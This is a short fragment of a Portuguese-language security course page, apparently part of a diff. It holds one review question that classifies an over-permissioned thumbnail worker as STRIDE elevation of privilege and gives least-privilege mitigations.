+  <details><summary>No threat model da API de upload, qual letra do STRIDE cobre "o worker de miniatura tem permissão de escrita no bucket inteiro" e qual a mitigação?</summary><p>E (Elevation of privilege): se uma falha no parser der execução de código, o atacante herda permissões amplas demais. A mitigação é o privilégio mínimo: worker isolado, credencial só de leitura nos originais e escrita apenas no prefixo das miniaturas.</p></details>
+
+  <nav class="pager"><a href="02-redes-e-linux.html">← Anterior</a><a href="04-devsecops.html">Próxima →</a></nav>
+</main>
+<p class="foot">Material aberto (CC BY 4.0) · feito por <a href="https://ogatalars.github.io/">Felipe Ogata</a> · sem rastreadores</p>
+</body>
+</html>
